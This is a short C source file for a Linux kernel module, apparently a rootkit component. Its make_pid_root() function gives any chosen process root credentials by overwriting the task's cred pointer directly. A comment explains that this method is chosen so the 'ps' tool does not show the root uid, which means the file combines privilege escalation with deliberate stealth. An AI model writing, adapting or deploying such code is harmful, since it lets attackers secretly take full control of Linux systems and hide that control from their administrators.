#include "root.h"
#include <linux/module.h> 

static struct task_struct *get_task_struct_by_pid(unsigned pid)
{
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;

    if(!proc_pid)
        return 0;
    
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

int make_pid_root(unsigned pid)
{
    struct task_struct *task;
    struct cred *new_cred;

    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    task = get_task_struct_by_pid(pid);
    if (task == NULL){
      printk("Failed to get current task info.\n");
      return -1;
    }

    new_cred = prepare_creds();
    if (new_cred == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }
    new_cred->uid = kuid;
    new_cred->gid = kgid;
    new_cred->euid = kuid;
    new_cred->egid = kgid;

    // Dirty creds assignment so "ps" doesn't show the root uid!
    // If one uses commit_creds(new_cred), not only this would only affect 
    // the current calling task but would also display the new uid (more visible).
    // rcu_assign_pointer is taken from the commit_creds source code (kernel/cred.c)
    rcu_assign_pointer(task->cred, new_cred);
    return 0;
}

MODULE_LICENSE("GPL");